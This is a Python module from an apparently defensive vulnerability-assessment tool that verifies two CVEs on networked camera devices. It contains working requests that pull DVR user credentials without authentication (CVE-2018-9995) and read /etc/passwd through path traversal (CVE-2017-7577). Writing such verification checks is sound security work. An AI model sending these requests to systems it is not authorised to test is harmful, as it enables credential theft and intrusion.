"""Verification engine (Phase 6): can PISA safely confirm, on the real
target, the vulnerable condition Phase 5's applicability engine
concluded is present?

Strict one-way pipeline: CVE -> APPLICABILITY -> VERIFICATION. This
module reads applicability_status (Phase 5), never writes it. It writes
verification_status only. It never touches exploitation_status, never
calls RouterSploit, never attempts to obtain a shell — see
.scratch/pisa-phase6-verification.md for the full scope boundary and
why CVE-2017-16725 (this project's own real testbed CVE) is explicitly
NOT verifiable in this phase (a stack buffer overflow can't be
confirmed without triggering it, which is exploitation, not
verification).

Every verification test here has an explicit security hypothesis tied
to a specific, real CVE — never a generic "send a request and see what
happens." Only PASSIVE/SAFE_ACTIVE tests exist; nothing here can modify
device state, obtain a shell, or persist anything on the target.
"""
import json
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Callable

import requests

import config
from pisa.db import queries


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


RESULT_VERIFIED_VULNERABLE = "VERIFIED_VULNERABLE"
RESULT_NOT_VERIFIED = "NOT_VERIFIED"
RESULT_INCONCLUSIVE = "INCONCLUSIVE"
RESULT_NOT_ATTEMPTED = "NOT_ATTEMPTED"
RESULT_VERIFICATION_AVAILABLE = "VERIFICATION_AVAILABLE"

# Internal execution states (instruction 22) — richer than the public
# verification_status enum on purpose. Every one of these except OK maps
# to the public RESULT_INCONCLUSIVE; the detail is preserved in
# verification_attempts.execution_state, never discarded.
STATE_OK = "OK"
STATE_TIMEOUT = "TIMEOUT"
STATE_TARGET_UNREACHABLE = "TARGET_UNREACHABLE"
STATE_MALFORMED_RESPONSE = "MALFORMED_RESPONSE"
STATE_TEST_UNAVAILABLE = "TEST_UNAVAILABLE"

SAFETY_PASSIVE = "PASSIVE"
SAFETY_SAFE_ACTIVE = "SAFE_ACTIVE"

# applicability_status values that permit verification at all. NOT_APPLICABLE/
# UNKNOWN/NO_CPE_DATA are never eligible — see _is_eligible.
_ALWAYS_ELIGIBLE_APPLICABILITY = ("AFFECTED",)


@dataclass
class VerificationOutcome:
    """What a test's check() function returns — internal, richer than
    the public result. `vulnerable` is None exactly when execution_state
    != OK (we never guess a vulnerable/not-vulnerable verdict out of a
    timeout or malformed response)."""
    execution_state: str
    vulnerable: bool | None
    reason: str
    evidence: dict = field(default_factory=dict)


@dataclass
class VerificationTest:
    test_id: str
    name: str
    description: str
    hypothesis: str
    cve_ids: tuple
    protocol: str
    safety_level: str
    supports_potentially_affected: bool
    check: Callable[[str, int, float], VerificationOutcome]


def _redact_evidence(evidence: dict) -> dict:
    """Instruction 23: never surface passwords/tokens/cookies/keys in
    normal output. Applied once, centrally, rather than trusting every
    individual test to remember — a test's raw evidence dict may contain
    a `_sensitive_keys` list naming fields to mask; everything else
    passes through unchanged."""
    sensitive_keys = evidence.get("_sensitive_keys", ())
    redacted = {k: v for k, v in evidence.items() if k != "_sensitive_keys"}
    for key in sensitive_keys:
        if key in redacted:
            redacted[key] = "***REDACTED***"
    return redacted


# ---------------------------------------------------------------------------
# HTTP-CREDS-DISCLOSURE-001 — CVE-2018-9995
#
# Hypothesis: the target's embedded DVR/NVR web management interface
# exposes an unauthenticated endpoint (/device.rsp?opt=user&cmd=list,
# with a uid=admin cookie) that discloses every configured user's
# credentials in a JSON response — the exact, real condition
# RouterSploit's cameras/multi/dvr_creds_disclosure module checks for
# (verified against that module's actual source during the earlier
# target-selection review — this is not a guessed hypothesis).
#
# Expected vulnerable behavior: HTTP 200, JSON body with a "list" array
# whose entries contain "uid"/"pwd" fields.
# Expected non-vulnerable behavior: non-200, or 200 with a body that
# doesn't parse as JSON / lacks that structure (auth required, endpoint
# doesn't exist, or a patched response shape).
# ---------------------------------------------------------------------------

def _check_http_creds_disclosure(ip: str, port: int, timeout: float) -> VerificationOutcome:
    url = f"http://{ip}:{port}/device.rsp"
    try:
        resp = requests.get(url, params={"opt": "user", "cmd": "list"}, cookies={"uid": "admin"}, timeout=timeout)
    except requests.exceptions.Timeout:
        return VerificationOutcome(STATE_TIMEOUT, None, "Request timed out waiting for a response.")
    except requests.exceptions.RequestException as e:
        return VerificationOutcome(STATE_TARGET_UNREACHABLE, None, f"Could not reach target: {e}")

    if resp.status_code != 200:
        return VerificationOutcome(
            STATE_OK, False, f"Endpoint returned HTTP {resp.status_code}, not the expected 200.",
            {"status_code": resp.status_code},
        )

    try:
        data = resp.json()
    except ValueError:
        return VerificationOutcome(
            STATE_MALFORMED_RESPONSE, None, "Response was HTTP 200 but not valid JSON — cannot interpret.",
            {"status_code": 200, "body_preview": resp.text[:200]},
        )

    entries = data.get("list") if isinstance(data, dict) else None
    if not isinstance(entries, list) or not entries:
        return VerificationOutcome(
            STATE_OK, False,
            "Response was valid JSON but had no 'list' of credential entries — likely patched or requires auth.",
            {"status_code": 200, "body_preview": json.dumps(data)[:200]},
        )

    disclosed = [e for e in entries if isinstance(e, dict) and "uid" in e and "pwd" in e]
    if not disclosed:
        return VerificationOutcome(
            STATE_OK, False, "'list' present but entries don't contain the expected uid/pwd credential fields.",
            {"status_code": 200, "entry_count": len(entries)},
        )

    return VerificationOutcome(
        STATE_OK, True,
        f"Unauthenticated request disclosed {len(disclosed)} credential entr{'y' if len(disclosed) == 1 else 'ies'}.",
        {
            "status_code": 200, "credentials_disclosed": True, "entry_count": len(disclosed),
            "usernames": [e.get("uid") for e in disclosed],
            "passwords": [e.get("pwd") for e in disclosed], "_sensitive_keys": ["passwords"],
        },
    )


HTTP_CREDS_DISCLOSURE_001 = VerificationTest(
    test_id="HTTP-CREDS-DISCLOSURE-001",
    name="Unauthenticated DVR/NVR credential disclosure",
    description="Requests /device.rsp?opt=user&cmd=list with a uid=admin cookie, checks for a credential list.",
    hypothesis="Target exposes user credentials via an unauthenticated GET request (CVE-2018-9995).",
    cve_ids=("CVE-2018-9995",),
    protocol="http",
    safety_level=SAFETY_SAFE_ACTIVE,
    supports_potentially_affected=True,  # a generic OEM-family condition, not version-sensitive
    check=_check_http_creds_disclosure,
)


# ---------------------------------------------------------------------------
# HTTP-PATH-TRAVERSAL-001 — CVE-2017-7577
#
# Hypothesis: the target's embedded uc-httpd web server fails to
# sanitize ".." path traversal sequences, allowing an unauthenticated
# read of /etc/passwd from outside the web root (same condition
# RouterSploit's cameras/xiongmai/uc_httpd_path_traversal module checks
# for — again taken from that module's real source, not guessed).
#
# Expected vulnerable behavior: HTTP 200 with a body matching the
# well-known /etc/passwd structure (root:...:0:0:).
# Expected non-vulnerable behavior: non-200, or 200 without that
# recognizable structure (a custom error page, or the traversal is
# blocked).
# ---------------------------------------------------------------------------

def _check_http_path_traversal(ip: str, port: int, timeout: float) -> VerificationOutcome:
    url = f"http://{ip}:{port}/../../../../../etc/passwd"
    try:
        resp = requests.get(url, timeout=timeout)
    except requests.exceptions.Timeout:
        return VerificationOutcome(STATE_TIMEOUT, None, "Request timed out waiting for a response.")
    except requests.exceptions.RequestException as e:
        return VerificationOutcome(STATE_TARGET_UNREACHABLE, None, f"Could not reach target: {e}")

    if resp.status_code != 200:
        return VerificationOutcome(
            STATE_OK, False, f"Traversal request returned HTTP {resp.status_code}, not the expected 200.",
            {"status_code": resp.status_code},
        )

    body = resp.text or ""
    if "root:" in body and ":0:0:" in body:
        return VerificationOutcome(
            STATE_OK, True, "Response body matches the /etc/passwd file structure — path traversal succeeded.",
            {"status_code": 200, "body_preview": body[:500]},
        )

    return VerificationOutcome(
        STATE_OK, False, "HTTP 200 returned but body does not match the expected /etc/passwd structure.",
        {"status_code": 200, "body_preview": body[:200]},
    )


HTTP_PATH_TRAVERSAL_001 = VerificationTest(
    test_id="HTTP-PATH-TRAVERSAL-001",
    name="uc-httpd unauthenticated path traversal",
    description="Requests /../../../../../etc/passwd and checks for the well-known /etc/passwd content signature.",
    hypothesis="Web server fails to sanitize path traversal, allowing unauthenticated file read (CVE-2017-7577).",
    cve_ids=("CVE-2017-7577",),
    protocol="http",
    safety_level=SAFETY_SAFE_ACTIVE,
    supports_potentially_affected=True,
    check=_check_http_path_traversal,
)


_TESTS = {t.test_id: t for t in (HTTP_CREDS_DISCLOSURE_001, HTTP_PATH_TRAVERSAL_001)}

# CVE-2017-16725 (this project's own real applicability-engine testbed
# CVE, a Xiongmai stack buffer overflow) is deliberately NOT in _TESTS.
# Confirming a stack buffer overflow requires actually triggering it —
# that is exploitation (Phase 7+), not a safe, deterministic,
# PASSIVE/SAFE_ACTIVE verification check. Documented explicitly per
# instruction 18 rather than silently omitted or forced into this
# framework anyway.


def find_tests_for_cve(cve_id: str) -> list:
    return [t for t in _TESTS.values() if cve_id in t.cve_ids]


def _is_eligible(applicability_status: str, test: VerificationTest) -> bool:
    if applicability_status in _ALWAYS_ELIGIBLE_APPLICABILITY:
        return True
    if applicability_status == "POTENTIALLY_AFFECTED":
        return test.supports_potentially_affected
    return False


def _map_execution_to_public_result(outcome: VerificationOutcome) -> str:
    if outcome.execution_state != STATE_OK:
        return RESULT_INCONCLUSIVE
    if outcome.vulnerable is True:
        return RESULT_VERIFIED_VULNERABLE
    if outcome.vulnerable is False:
        return RESULT_NOT_VERIFIED
    return RESULT_INCONCLUSIVE


def _pick_port(device: dict, protocol: str) -> int | None:
    try:
        open_ports = json.loads(device.get("open_ports") or "[]")
    except (ValueError, TypeError):
        return None
    for entry in open_ports:
        port = entry.get("port") if isinstance(entry, dict) else None
        if port is not None and config.M2_PROTOCOL_PORTS.get(port) == protocol:
            return port
    return None


def verification_availability(conn, device_id: int, cve_id: str) -> dict:
    """Answers "is verification even possible here" without running
    anything — instruction 5's VERIFICATION_AVAILABLE=false case, and
    the basis for exposing eligibility in a future UI without side
    effects."""
    row = queries.get_device_cve(conn, device_id, cve_id)
    tests = find_tests_for_cve(cve_id)
    if row is None:
        return {"available": False, "reason": f"No device_cves row for {cve_id}."}
    if not tests:
        return {"available": False, "reason": f"No verification test implemented for {cve_id}."}
    eligible = [t for t in tests if _is_eligible(row.get("applicability_status"), t)]
    if not eligible:
        return {
            "available": False,
            "reason": f"applicability_status={row.get('applicability_status')!r} does not permit verification.",
        }
    return {"available": True, "test_ids": [t.test_id for t in eligible]}


def run_verification(conn, device_id: int, cve_id: str) -> dict:
    """The one entry point. Gates on Phase 5's applicability_status
    (read-only — never modified here), runs at most one eligible test,
    persists a verification_attempts row (full provenance) and updates
    device_cves.verification_status (the current-conclusion summary).
    Never calls RouterSploit, never attempts exploitation, never
    modifies applicability_status.
    """
    row = queries.get_device_cve(conn, device_id, cve_id)
    if row is None:
        return {"status": RESULT_NOT_ATTEMPTED, "reason": f"No device_cves row for device {device_id} / {cve_id}."}

    tests = find_tests_for_cve(cve_id)
    if not tests:
        return {"status": RESULT_NOT_ATTEMPTED, "reason": f"No verification test implemented for {cve_id}."}

    applicability_status = row.get("applicability_status")
    eligible = [t for t in tests if _is_eligible(applicability_status, t)]
    if not eligible:
        return {
            "status": RESULT_NOT_ATTEMPTED,
            "reason": f"applicability_status={applicability_status!r} does not permit verification for {cve_id}.",
        }

    test = eligible[0]
    device = queries.get_device_by_id(conn, device_id)
    if device is None:
        return {"status": RESULT_NOT_ATTEMPTED, "reason": f"Device {device_id} not found."}

    port = _pick_port(device, test.protocol)
    started_at = _now()
    start_perf = time.monotonic()

    if port is None:
        outcome = VerificationOutcome(
            STATE_TEST_UNAVAILABLE, None,
            f"No open port matching protocol {test.protocol!r} recorded for this device — cannot run {test.test_id}.",
        )
    else:
        outcome = test.check(device["ip_address"], port, config.VERIFICATION_TIMEOUT)

    duration_ms = (time.monotonic() - start_perf) * 1000
    completed_at = _now()
    public_result = _map_execution_to_public_result(outcome)
    evidence = _redact_evidence(outcome.evidence)

    queries.record_verification_attempt(
        conn, device_id, cve_id, test.test_id, public_result, outcome.execution_state,
        outcome.reason, evidence, started_at, completed_at, duration_ms,
    )
    queries.set_device_cve_verification(conn, device_id, cve_id, public_result)

    return {
        "status": public_result, "test_id": test.test_id, "execution_state": outcome.execution_state,
        "reason": outcome.reason, "evidence": evidence, "duration_ms": duration_ms,
    }
